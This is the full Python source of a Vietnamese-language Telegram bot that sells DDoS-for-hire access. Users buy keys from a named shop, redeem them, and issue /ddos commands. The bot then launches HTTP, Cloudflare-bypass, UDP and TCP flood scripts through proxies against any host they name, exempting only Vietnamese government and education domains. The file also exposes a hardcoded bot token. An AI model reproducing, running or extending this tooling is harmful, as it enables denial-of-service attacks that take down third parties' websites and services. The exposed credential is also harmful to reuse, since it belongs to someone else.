import telebot
import threading
import subprocess
import time
import psutil
import datetime
import hashlib
import sqlite3

bot_token = '6399917711:AAGrv42eqMy5NtNgaRdeQURpZ-Jg6Z8a3MM'
bot = telebot.TeleBot(bot_token)
ADMIN_ID = 6425545597
allowed_users = []
is_bot_active = True

key_dict = {}
cooldown_dict = {}
valid_keys = {}


def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()

    while cmd_process.poll() is None:
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Đã dùng lệnh tấn công.")
                return
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

def get_thread_connection():
    return sqlite3.connect('user_data.db')

def create_table():
    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            expiration_time TEXT
        )
    ''')
    conn.commit()
    conn.close()

create_table()

@bot.message_handler(commands=['taokey'])
def generate_key(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        return

    key = message.text.split()[1]
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)

    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('INSERT INTO users (key, expiration_time) VALUES (?, ?)', (key, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()

    conn.close()

    valid_keys[key] = expiration_time
    bot.reply_to(message, f'Tạo key "{key}" thành công. Key sẽ hết hạn sau 30 ngày.')

@bot.message_handler(commands=['nhapkey'])
def enter_key(message):
    user_id = message.from_user.id

    if len(message.text.split()) != 2:
        return

    key = message.text.split()[1]

    if key in valid_keys and valid_keys[key] > datetime.datetime.now():
        allowed_users.append(user_id)
        del valid_keys[key]
        save_user_to_database(user_id, key)
        bot.reply_to(message, 'Key đã được chấp nhận. Bạn có thể sử dụng lệnh /ddos ngay bây giờ.')
    else:
        bot.reply_to(message, 'Key không hợp lệ. Vui lòng kiểm tra lại hoặc liên hệ admin.')

def load_users_from_database():
    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    current_time = datetime.datetime.now()

    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')

        if expiration_time > current_time:
            allowed_users.append(user_id)

    conn.close()


def save_user_to_database(user_id, key):
    new_connection = sqlite3.connect('user_data.db')
    new_cursor = new_connection.cursor()

    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    new_cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, key, expiration_time)
        VALUES (?, ?, ?)
    ''', (user_id, key, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    new_connection.commit()

    new_connection.close()  # Close the connection when done

load_users_from_database()

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /nhapkey để nhập Key\nBuy Key Tại: shop.viduchung.info')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddos <methods> <link website>')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('ddos', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('ddos', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /ddos <methods> <ip> <port>')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'HTTP-LOAD' or method == 'DESTROY' or method == 'CF-BYPASS' or method == 'FLOOD' or method == 'SKYNET':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['HTTP-LOAD', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'HTTP-LOAD':
            command = ["node", "http", host, "120", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "120", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'FLOOD':
            command = ["node", "flood.js", host, "120", "8", "proxy.txt", "64", "15"]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "120", "64", "35"]
            duration = 120
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "120", "64", "35"]
            duration = 120

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin: LongWjbu\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 180s «\n  ➤ Methods » {method} «\n  ➤ Cooldown » 120s «\n  ➤ Plan » VIP «\n  ┗➤Bot Ver 2.0')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')


bot.infinity_polling(timeout=60, long_polling_timeout = 1)
